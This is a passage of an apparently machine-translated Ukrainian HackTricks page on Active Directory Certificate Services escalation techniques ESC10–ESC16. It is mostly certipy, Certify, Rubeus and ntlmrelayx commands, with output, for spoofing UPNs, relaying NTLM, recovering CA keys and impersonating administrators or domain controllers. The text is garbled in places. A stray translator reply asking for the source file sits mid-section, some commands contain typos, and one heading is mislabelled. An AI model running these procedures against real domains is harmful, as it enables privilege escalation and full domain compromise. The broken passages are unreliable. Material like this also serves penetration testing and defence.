Поле `userPrincipalName` користувача `Jane` потім відновлюється до початкового значення `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за виданим сертифікатом тепер повертає NT-хеш `Administrator@corp.local`. Команда має містити `-domain <domain>` через відсутність специфікації домену в сертифікаті:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Слабкі відображення сертифікатів - ESC10

### Пояснення

Під ESC10 маються на увазі два значення ключів реєстру на контролері домену:

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` включає біт `UPN` (`0x4`).

### Випадок зловживання 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A з правами `GenericWrite` може бути використаний для компрометації будь-якого облікового запису B.

Наприклад, маючи права `GenericWrite` на `Jane@corp.local`, нападник намагається скомпрометувати `Administrator@corp.local`. Процедура повторює ESC9, дозволяючи використовувати будь-який шаблон сертифіката.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Надалі `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно опускаючи частину `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього від імені `Jane` запитується сертифікат для клієнтської автентифікації, використовуючи шаблон за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` потім відновлюється до свого початкового значення, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Аутентифікація за допомогою отриманого сертифіката поверне NT hash для `Administrator@corp.local`, тому в команді необхідно вказати домен через відсутність даних про домен у сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Сценарій зловживання 2

Якщо в `CertificateMappingMethods` міститься бітовий прапор `UPN` (`0x4`), обліковий запис A з правами `GenericWrite` може скомпрометувати будь-який обліковий запис B, який не має властивості `userPrincipalName`, включно з машинними обліковими записами та вбудованим доменним адміністратором `Administrator`.

Тут мета — скомпрометувати `DC$@corp.local`, починаючи з отримання хеша `Jane` за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` користувача `Jane` потім встановлюється в `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Запитано сертифікат для аутентифікації клієнта від імені `Jane` із використанням шаблону за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Після цього процесу `userPrincipalName` користувача `Jane` повертається до початкового значення.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для автентифікації через Schannel використовується опція Certipy `-ldap-shell`, що вказує на успішну аутентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell команди, такі як `set_rbcd`, дозволяють проводити атаки Resource-Based Constrained Delegation (RBCD), що потенційно можуть скомпрометувати контролер домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-які облікові записи користувачів, які не мають `userPrincipalName` або у яких він не співпадає з `sAMAccountName`, причому за замовчуванням `Administrator@corp.local` є основною ціллю через підвищені LDAP-привілеї та відсутність `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не сконфігурований з `IF_ENFORCEENCRYPTICERTREQUEST`, це дозволяє виконувати NTLM relay attacks без підпису через RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Ви можете використати `certipy` для перевірки, чи `Enforce Encryption for Requests` вимкнено, і certipy покаже `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену ми повинні вказати `-template` у DomainController.

Або використовуючи [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access до ADCS CA with YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority так, щоб зберігати її на зовнішньому пристрої, наприклад на "Yubico YubiHSM2".

Якщо USB-пристрій підключено до сервера CA через USB-порт, або через USB device server у випадку, якщо сервер CA є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають "password"), щоб генерувати та використовувати ключі в YubiHSM.

Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Посилання: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Сценарій зловживання

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, і ви отримали shell access, можливо відновити ключ.

Спершу потрібно отримати CA certificate (це публічне), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте команду certutil `-sign`, щоб підробити новий довільний сертифікат, використовуючи сертифікат CA та його приватний ключ.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дозволяє додавати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, які відповідають за політики видачі, можна виявити в Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов'язати з AD-групою, використовуючи атрибут `msDS-OIDToGroupLink` цього об'єкта, що дозволяє системі авторизувати користувача, який пред'являє сертифікат, ніби він є членом групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Іншими словами, коли користувач має дозвіл на реєстрацію сертифіката і сертифікат пов'язаний з OID-групою, користувач може успадкувати привілеї цієї групи.

Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозволи користувача, які можна використати за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію для шаблону `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Все, що потрібно зробити — просто вказати шаблон; він отримає сертифікат з правами OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

Опис на https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно вичерпний. Нижче наведено цитату оригінального тексту.

ESC14 стосується вразливостей, що виникають через "weak explicit certificate mapping", головним чином через неправильне використання або небезпечну конфігурацію атрибута `altSecurityIdentities` на облікових записах користувачів або комп'ютерів в Active Directory. Цей багатоманітний атрибут дозволяє адміністраторам вручну пов'язувати X.509 сертифікати з обліковим записом AD для цілей аутентифікації. Коли він заповнений, ці явні відображення можуть переважати над стандартною логікою відображення сертифікатів, яка зазвичай покладається на UPN або DNS-імена в SAN сертифіката, або SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

"Слабке" відображення виникає, коли строкове значення, що використовується в атрибуті `altSecurityIdentities` для ідентифікації сертифіката, занадто широке, легко відгадуване, покладається на неунікальні поля сертифіката або використовує легко підроблювані компоненти сертифіката. Якщо атакуючий може отримати або створити сертифікат, атрибути якого відповідають такому слабо визначеному явному відображенню для привілейованого облікового запису, він може використовувати цей сертифікат для аутентифікації та імітації цього облікового запису.

Приклади потенційно слабких рядків відображення `altSecurityIdentities` включають:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати для відображення, такі як:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

Безпека цих відображень сильно залежить від специфічності, унікальності та криптографічної стійкості обраних ідентифікаторів сертифіката, що використовуються в рядку відображення. Навіть за увімкнених режимів суворого прив'язування сертифікатів на Domain Controllers (які здебільшого впливають на неявні відображення, що базуються на SAN UPN/DNS і розширенні SID), неправильно налаштований запис `altSecurityIdentities` все ще може створити прямий шлях для імітації, якщо сама логіка відображення є помилковою або надто дозволяє.

### Abuse Scenario

ESC14 націлений на **explicit certificate mappings** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут встановлено (за задумом або через неправильну конфігурацію), атакуючі можуть імітувати облікові записи, пред'являючи сертифікати, що відповідають відображенню.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Збережіть і конвертуйте сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Аутентифікуватися (використовуючи сертифікат)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Я не бачу вмісту файлу. Надішліть, будь ласка, текст (markdown) з src/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md, який потрібно перекласти, і я виконую переклад з дотриманням вказаних правил.
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

Опис на https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc надзвичайно ґрунтовний. Нижче наведено цитату з оригінального тексту.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Зловживання

Нижче наведено посилання на [це посилання]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Натисніть, щоб побачити більш детальні методи використання.

Команда Certipy `find` може допомогти виявити шаблони V1, які потенційно вразливі до ESC15, якщо CA не виправлено.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Direct Impersonation via Schannel

**Крок 1: Запитати сертифікат, вказавши Application Policy "Client Authentication" та цільовий UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Уразливий V1 шаблон з "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Вставляє OID `1.3.6.1.5.5.7.3.2` у розширення Application Policies CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для підміни особи.

**Крок 2: Аутентифікуйтеся через Schannel (LDAPS), використовуючи отриманий сертифікат.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Крок 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Цей сертифікат потрібен атакуючому (`attacker@corp.local`), щоб стати enrollment agent. Тут для власної ідентичності атакуючого не вказано UPN, оскільки мета — отримати можливість агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Вставляє OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте "agent" сертифікат для запиту сертифіката від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, який використовує сертифікат з Кроку 1 як agent сертифікат.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Аутентифікуйтеся як привілейований користувач, використовуючи сертифікат "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Вимкнено розширення безпеки на CA (глобально)-ESC16

### Пояснення

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** відноситься до сценарію, коли конфігурація AD CS не вимагає включення розширення **szOID_NTDS_CA_SECURITY_EXT** у всі сертифікати, і нападник може скористатися цим таким чином:

1. Запит сертифіката **without SID binding**.

2. Використання цього сертифіката **for authentication as any account**, наприклад для імітації облікового запису з високими привілеями (наприклад, Адміністратор домену).

You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Зловживання

Наведене посилається на [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Клікніть, щоб побачити більш детальні методи використання.

Щоб визначити, чи середовище Active Directory Certificate Services (AD CS) вразливе до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитайте початковий UPN облікового запису жертви (Необов'язково - для відновлення).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN облікового запису жертви на `sAMAccountName` цільового адміністратора.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (Якщо потрібно) Отримати облікові дані для облікового запису "victim" (наприклад, через Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запитайте сертифікат від імені користувача "victim" з _будь-якого підходящого шаблону автентифікації клієнта_ (наприклад, "User") на CA, вразливому до ESC16.** Оскільки CA вразливий до ESC16, він автоматично не додаватиме SID security extension до виданого сертифікату, незалежно від конкретних налаштувань цього розширення в шаблоні. Встановіть змінну середовища Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запросіть сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Повернути UPN облікового запису "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Аутентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Компрометація лісів за допомогою сертифікатів, пояснена в пасивному стані

### Порушення довірчих зв'язків між лісами через скомпрометовані CA

Конфігурація для **cross-forest enrollment** зроблена відносно простою. **root CA certificate** з resource forest **публікується в account forests** адміністраторами, а сертифікати **enterprise CA** з resource forest **додаються до `NTAuthCertificates` та AIA containers в кожному account forest**. Для пояснення, така схема надає **CA в resource forest повний контроль** над усіма іншими лісами, для яких він керує PKI. Якщо цей CA буде **скомпрометовано атаками**, сертифікати для всіх користувачів як у resource, так і в account forests могли б бути **підроблені ними**, тим самим порушивши межу безпеки лісу.

### Привілеї enrollment, надані foreign principals

У multi-forest середовищах слід дотримуватися обережності щодо Enterprise CAs, які **publish certificate templates**, що дозволяють **Authenticated Users or foreign principals** (користувачі/групи, зовнішні для лісу, до якого належить Enterprise CA) **enrollment and edit rights**.\
Після аутентифікації через trust, **Authenticated Users SID** додається до токена користувача AD. Таким чином, якщо домен має Enterprise CA з шаблоном, який **дозволяє Authenticated Users enrollment rights**, шаблон потенційно може бути **enrolled in by a user from a different forest**. Аналогічно, якщо **enrollment rights явно надані foreign principal шаблоном**, створюється **cross-forest access-control relationship**, що дозволяє принципалу з одного лісу **enroll in a template from another forest**.

Обидва сценарії призводять до **збільшення attack surface** з одного лесу до іншого. Налаштування certificate template можуть бути використані атакуючим для отримання додаткових привілеїв у foreign domain.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
